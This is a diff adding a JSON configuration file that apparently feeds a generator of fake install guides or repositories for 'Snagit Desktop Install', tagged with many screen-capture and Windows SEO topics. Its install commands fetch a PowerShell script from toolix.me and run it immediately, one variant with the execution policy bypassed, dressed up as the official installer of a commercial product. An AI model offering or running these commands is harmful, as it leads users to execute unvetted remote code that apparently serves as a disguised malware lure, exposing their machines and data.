@@ -1,0 +1,29 @@
+{
+  "repo": "Snagit-Desktop-Install",
+  "product": "Snagit Desktop Install",
+  "product_title": "Snagit Desktop Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "video-editing",
+  "topics": [
+    "how-to-install-snagit-desktop-install",
+    "snagit-desktop-install-app",
+    "media-capture",
+    "creator-workflow",
+    "windows-recording",
+    "content-creator",
+    "gameplay-recording",
+    "screen-capture",
+    "snagit-desktop-install-desktop-tool",
+    "snagit-desktop-install-windows-tool",
+    "snagit-desktop-install",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
